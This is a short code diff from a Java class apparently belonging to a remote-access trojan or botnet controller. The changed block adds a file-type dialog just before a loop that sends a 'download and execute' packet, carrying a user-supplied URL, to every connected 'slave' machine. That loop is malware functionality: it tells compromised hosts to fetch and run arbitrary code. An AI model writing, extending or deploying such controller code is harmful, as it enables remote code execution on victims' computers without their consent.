@@ -1115,6 +1115,8 @@ public class Frame extends BaseFrame {
 
 					result = result.trim().replace(" ", "%20");
 					
+					String filetype = FrameFileType.showDialog();
+					
 					for (Slave slave : servers) {
 						slave.addToSendQueue(new Packet17DownloadExecute(result));
 					}
